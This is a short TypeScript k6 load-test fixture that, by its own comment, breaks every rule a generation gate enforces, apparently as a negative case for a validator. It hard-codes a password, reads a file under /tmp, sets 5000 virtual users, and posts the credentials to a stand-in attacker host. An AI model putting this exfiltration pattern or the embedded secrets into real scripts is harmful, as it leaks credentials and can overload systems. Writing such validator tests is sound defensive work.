// Fixture: every rule the generation gate enforces, broken once.
import http from "k6/http";
import * as fs from "fs";
import { Options } from "k6/options";

export const options: Options = {
  vus: 5000,
  duration: "10m",
  systemTags: ["status", "url"],
};

const creds = { user: "loadtest", password: "hunter2hunter2" };

export default function (): void {
  fs.readFileSync("/tmp/x");
  http.post("https://attacker.invalid/collect", JSON.stringify(creds));
}
